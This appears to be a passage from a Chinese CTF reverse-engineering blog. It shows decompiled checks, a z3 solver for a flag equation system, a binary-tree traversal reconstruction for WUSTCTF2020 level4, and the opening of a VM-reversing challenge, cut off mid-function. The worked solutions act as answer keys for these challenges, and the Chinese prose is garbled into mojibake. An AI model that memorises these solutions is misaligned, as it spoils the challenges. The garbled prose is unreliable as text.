= a1[<span class="number">3</span>];</span><br><span class="line">  v5 = a1[<span class="number">4</span>];</span><br><span class="line">  v6 = a1[<span class="number">6</span>];</span><br><span class="line">  v7 = a1[<span class="number">5</span>];</span><br><span class="line">  v8 = a1[<span class="number">7</span>];</span><br><span class="line">  v9 = a1[<span class="number">8</span>];</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">-85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + <span class="number">-45</span> * v5 + <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = a1[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">30</span> * v11 + <span class="number">-70</span> * v9 + <span class="number">-122</span> * v6 + <span class="number">-81</span> * v7 + <span class="number">-66</span> * v5 + <span class="number">-115</span> * v4 + <span class="number">-41</span> * v3 + <span class="number">-86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == <span class="number">-54400</span></span><br><span class="line">      &amp;&amp; <span class="number">-103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + <span class="number">-89</span> * v3 + <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (v6 &lt;&lt; <span class="number">6</span>) - <span class="number">120</span> * v9 == <span class="number">-10283</span></span><br><span class="line">      &amp;&amp; <span class="number">71</span> * v6 + (v7 &lt;&lt; <span class="number">7</span>) + <span class="number">99</span> * v5 + <span class="number">-111</span> * v3 + <span class="number">85</span> * v1 + <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span></span><br><span class="line">      &amp;&amp; <span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + <span class="number">-19</span> * v6 + <span class="number">99</span> * v7 + <span class="number">-117</span> * v5 + <span class="number">-69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == <span class="number">-2944</span></span><br><span class="line">      &amp;&amp; <span class="number">-54</span> * v11 + <span class="number">-23</span> * v8 + <span class="number">-82</span> * v3 + <span class="number">-85</span> * v2 + <span class="number">124</span> * v1 - <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == <span class="number">-2222</span></span><br><span class="line">      &amp;&amp; <span class="number">-83</span> * v11 + <span class="number">-111</span> * v7 + <span class="number">-57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 - <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == <span class="number">-13258</span></span><br><span class="line">      &amp;&amp; <span class="number">81</span> * v11 + <span class="number">-48</span> * v9 + <span class="number">66</span> * v8 + <span class="number">-104</span> * v6 + <span class="number">-121</span> * v7 + <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + <span class="number">-85</span> * v2 + <span class="number">80</span> * v1 == <span class="number">-1559</span></span><br><span class="line">      &amp;&amp; <span class="number">101</span> * v11 + <span class="number">-85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + <span class="number">-83</span> * v5 + <span class="number">-101</span> * v4 + <span class="number">90</span> * v3 + <span class="number">-28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">99</span> * v11 + <span class="number">-28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + <span class="number">-18</span> * v7 + <span class="number">-127</span> * v5 + <span class="number">6</span> * v4 + <span class="number">-9</span> * v3 + <span class="number">-93</span> * v1 + <span class="number">58</span> * v2 == <span class="number">-1697</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯å®ƒçš„v1å’Œv2ï¼Œv6å’Œv7è¦æ¢é¡ºåºï¼Œæ‹¿åˆ°è¾“å…¥çš„ä¸œè¥¿æ”¾å…¥ç¨‹åºå°±èƒ½æ‹¿åˆ°ç¬¬äºŒæ®µflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">v1, v2, v3, v4, v5, v6, v7, v8, v9, v11 = BitVecs(</span><br><span class="line">    <span class="string">&#x27;v1 v2 v3 v4 v5 v6 v7 v8 v9 v11&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(v1 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v2 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v3 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v4 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v5 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v6 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v7 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v8 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v9 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(v11 &lt; <span class="number">128</span>)</span><br><span class="line">s.add(-<span class="number">85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + -<span class="number">45</span> * v5 +</span><br><span class="line">      <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span>)</span><br><span class="line">s.add(<span class="number">30</span> * v11 + -<span class="number">70</span> * v9 + -<span class="number">122</span> * v6 + -<span class="number">81</span> * v7 + -<span class="number">66</span> * v5 + -</span><br><span class="line">      <span class="number">115</span> * v4 + -<span class="number">41</span> * v3 + -<span class="number">86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == -<span class="number">54400</span>)</span><br><span class="line">s.add(-<span class="number">103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + -<span class="number">89</span> * v3 +</span><br><span class="line">      <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (v6 &lt;&lt; <span class="number">6</span>) - <span class="number">120</span> * v9 == -<span class="number">10283</span>)</span><br><span class="line">s.add(<span class="number">71</span> * v6 + (v7 &lt;&lt; <span class="number">7</span>) + <span class="number">99</span> * v5 + -<span class="number">111</span> * v3 + <span class="number">85</span> * v1 +</span><br><span class="line">      <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span>)</span><br><span class="line">s.add(<span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + -<span class="number">19</span> * v6 + <span class="number">99</span> * v7 + -</span><br><span class="line">      <span class="number">117</span> * v5 + -<span class="number">69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == -<span class="number">2944</span>)</span><br><span class="line">s.add(-<span class="number">54</span> * v11 + -<span class="number">23</span> * v8 + -<span class="number">82</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">124</span> * v1 -</span><br><span class="line">      <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == -<span class="number">2222</span>)</span><br><span class="line">s.add(-<span class="number">83</span> * v11 + -<span class="number">111</span> * v7 + -<span class="number">57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 -</span><br><span class="line">      <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == -<span class="number">13258</span>)</span><br><span class="line">s.add(<span class="number">81</span> * v11 + -<span class="number">48</span> * v9 + <span class="number">66</span> * v8 + -<span class="number">104</span> * v6 + -<span class="number">121</span> * v7 +</span><br><span class="line">      <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">80</span> * v1 == -<span class="number">1559</span>)</span><br><span class="line">s.add(<span class="number">101</span> * v11 + -<span class="number">85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + -<span class="number">83</span> * v5 + -</span><br><span class="line">      <span class="number">101</span> * v4 + <span class="number">90</span> * v3 + -<span class="number">28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span>)</span><br><span class="line">s.add(<span class="number">99</span> * v11 + -<span class="number">28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + -<span class="number">18</span> * v7 + -</span><br><span class="line">      <span class="number">127</span> * v5 + <span class="number">6</span> * v4 + -<span class="number">9</span> * v3 + -<span class="number">93</span> * v1 + <span class="number">58</span> * v2 == -<span class="number">1697</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">v8 = <span class="number">55</span></span><br><span class="line">v1 = <span class="number">48</span></span><br><span class="line">v6 = <span class="number">95</span></span><br><span class="line">v4 = <span class="number">82</span></span><br><span class="line">v2 = <span class="number">70</span></span><br><span class="line">v3 = <span class="number">117</span></span><br><span class="line">v11 = <span class="number">64</span></span><br><span class="line">v5 = <span class="number">84</span></span><br><span class="line">v7 = <span class="number">121</span></span><br><span class="line">v9 = <span class="number">119</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(v2)+<span class="built_in">chr</span>(v1)+<span class="built_in">chr</span>(v3)+<span class="built_in">chr</span>(v4)+<span class="built_in">chr</span>(v5) +</span><br><span class="line">      <span class="built_in">chr</span>(v7)+<span class="built_in">chr</span>(v6)+<span class="built_in">chr</span>(v8)+<span class="built_in">chr</span>(v9)+<span class="built_in">chr</span>(v11))</span><br></pre></td></tr></table></figure><h1 id="0x20-WUSTCTF2020-level4-äºŒå‰æ ‘"><a href="#0x20-WUSTCTF2020-level4-äºŒå‰æ ‘" class="headerlink" title="0x20.[WUSTCTF2020]level4(äºŒå‰æ ‘)"></a>0x20.[WUSTCTF2020]level4(äºŒå‰æ ‘)</h1><p>64ä½elfçš„é€†å‘ï¼Œå…ˆè¿è¡Œä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/Desktop$ ./attachment </span><br><span class="line">Practice my Data Structure code.....</span><br><span class="line">Typing....Struct.....char....*left....*right............emmmmm...OK!</span><br><span class="line">Traversal!</span><br><span class="line">Traversal <span class="built_in">type</span> 1:2f0t02T&#123;hcsiI_SwA__r7Ee&#125;</span><br><span class="line">Traversal <span class="built_in">type</span> 2:20f0Th&#123;2tsIS_icArE&#125;e7__w</span><br><span class="line">Traversal <span class="built_in">type</span> 3:    //type3(&amp;x[22]);   No way!</span><br></pre></td></tr></table></figure><p>ida:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Practice my Data Structure code.....&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Typing....Struct.....char....*left....*right............emmmmm...OK!&quot;</span>);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Traversal!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Traversal type 1:&quot;</span>);</span><br><span class="line">  type1(byte_601290);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nTraversal type 2:&quot;</span>);</span><br><span class="line">  type2(byte_601290);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nTraversal type 3:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    //type3(&amp;x[22]);   No way!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_400A37);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, <span class="string">&quot;I&#123;_&#125;Af2700ih_secTS2Et_wr&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    x[<span class="number">24</span> * i] = v2[i];</span><br><span class="line">  qword_601298 = &amp;unk_6011E8;</span><br><span class="line">  qword_6011F0 = &amp;unk_601260;</span><br><span class="line">  qword_601268 = &amp;unk_6010F8;</span><br><span class="line">  qword_601100 = &amp;unk_601110;</span><br><span class="line">  qword_601108 = &amp;unk_601140;</span><br><span class="line">  qword_601270 = &amp;unk_601230;</span><br><span class="line">  qword_601238 = &amp;unk_601158;</span><br><span class="line">  qword_601240 = &amp;unk_601098;</span><br><span class="line">  qword_6010A0 = &amp;unk_601200;</span><br><span class="line">  qword_6010A8 = &amp;unk_601188;</span><br><span class="line">  qword_6011F8 = &amp;unk_601170;</span><br><span class="line">  qword_601178 = &amp;unk_6011B8;</span><br><span class="line">  qword_601180 = &amp;unk_6010B0;</span><br><span class="line">  qword_6010B8 = x;</span><br><span class="line">  qword_6010C0 = &amp;unk_601218;</span><br><span class="line">  qword_6012A0 = &amp;unk_601278;</span><br><span class="line">  qword_601280 = &amp;unk_6010E0;</span><br><span class="line">  qword_601288 = &amp;unk_6011A0;</span><br><span class="line">  qword_6011B0 = &amp;unk_601128;</span><br><span class="line">  qword_601130 = &amp;unk_6012A8;</span><br><span class="line">  qword_601138 = &amp;unk_6011D0;</span><br><span class="line">  qword_6011D8 = &amp;unk_601248;</span><br><span class="line">  qword_6011E0 = &amp;unk_6010C8;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†çœ‹ä¸‹type1å’Œtype2ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">type1</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    type1(*(a1 + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">putchar</span>(*a1);</span><br><span class="line">    type1(*(a1 + <span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">type2</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    type2(*(a1 + <span class="number">1</span>));</span><br><span class="line">    type2(*(a1 + <span class="number">2</span>));</span><br><span class="line">    <span class="built_in">putchar</span>(*a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯äºŒå‰æ ‘çš„éå†ï¼ˆå…·ä½“æ–‡ç« çœ‹è¿™ä¸ªï¼š<a href="https://blog.csdn.net/LX18792732127/article/details/76167482%EF%BC%89%EF%BC%8C%E4%B8%80%E5%85%B1%E6%9C%893%E7%A7%8D%EF%BC%88%E5%85%88%E5%BA%8F%E9%81%8D%E5%8E%86%EF%BC%8C%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%EF%BC%8C%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%EF%BC%89%EF%BC%8C%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%98%AF%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E5%92%8C%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E3%80%82%E5%B7%AE%E4%B8%80%E4%B8%AA%E5%85%88%E5%BA%8F%E9%81%8D%E5%8E%86%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%B8%AD%E5%BA%8F%E5%90%8E%E5%BA%8F%E6%B1%82%E5%85%88%E5%BA%8F%EF%BC%9A">https://blog.csdn.net/LX18792732127/article/details/76167482ï¼‰ï¼Œä¸€å…±æœ‰3ç§ï¼ˆå…ˆåºéå†ï¼Œååºéå†ï¼Œä¸­åºéå†ï¼‰ï¼Œä¸Šé¢çš„æ˜¯ä¸­åºéå†å’Œååºéå†ã€‚å·®ä¸€ä¸ªå…ˆåºéå†ï¼Œä½¿ç”¨ä¸­åºååºæ±‚å…ˆåºï¼š</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reConstructBinaryTree</span>(<span class="params">self, post, tin</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(post) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root = TreeNode(post[-<span class="number">1</span>])</span><br><span class="line">        TinIndex = tin.index(post[-<span class="number">1</span>])</span><br><span class="line">        root.left = self.reConstructBinaryTree(</span><br><span class="line">            post[<span class="number">0</span>:TinIndex], tin[<span class="number">0</span>:TinIndex])</span><br><span class="line">        root.right = self.reConstructBinaryTree(</span><br><span class="line">            post[TinIndex:<span class="built_in">len</span>(post) - <span class="number">1</span>], tin[TinIndex + <span class="number">1</span>:])</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PreTraversal</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="keyword">if</span> root != <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(root.val, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            self.PreTraversal(root.left)</span><br><span class="line">            self.PreTraversal(root.right)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strm = <span class="string">&quot;2f0t02T&#123;hcsiI_SwA__r7Ee&#125;&quot;</span></span><br><span class="line">stre = <span class="string">&quot;20f0Th&#123;2tsIS_icArE&#125;e7__w&quot;</span></span><br><span class="line">post = <span class="built_in">list</span>(stre)  <span class="comment"># ååº</span></span><br><span class="line">tin = <span class="built_in">list</span>(strm)  <span class="comment"># ä¸­åº</span></span><br><span class="line"></span><br><span class="line">S = Solution()</span><br><span class="line">root = S.reConstructBinaryTree(post, tin)</span><br><span class="line">S.PreTraversal(root)</span><br></pre></td></tr></table></figure><h1 id="0x21-ç½‘é¼æ¯-2020-é’é¾™ç»„-singalï¼ˆvmé€†å‘ï¼‰"><a href="#0x21-ç½‘é¼æ¯-2020-é’é¾™ç»„-singalï¼ˆvmé€†å‘ï¼‰" class="headerlink" title="0x21.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]singalï¼ˆvmé€†å‘ï¼‰"></a>0x21.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]singalï¼ˆvmé€†å‘ï¼‰</h1><blockquote><p>  VMé€†å‘å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_43876357/article/details/108570305">https://blog.csdn.net/weixin_43876357/article/details/108570305</a></p></blockquote><p>çœ‹äº†wpçŸ¥é“è¿™è¿™ç±»é¢˜ç›®çš„åå­—ï¼šVMé€†å‘ï¼š</p><p>ä¸»å‡½æ•°å’Œå…³é”®å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a1[<span class="number">117</span>]; <span class="comment">// [esp+18h] [ebp-1D4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(a1, &amp;asc_403040, <span class="number">0x1C8</span>u);</span><br><span class="line">  vm_operad(a1, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good,The answer format is:flag &#123;&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">vm_operad</span><span class="params">(<span class="keyword">int</span> *str_local, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">100</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">100</span>]; <span class="comment">// [esp+77h] [ebp-81h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">  <span class="keyword">while</span> ( v9 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( str_local[v9] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v3[v6] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = str_local[v9 + <span class="number">1</span>] + input[v8];</span><br><span class="line">        v9 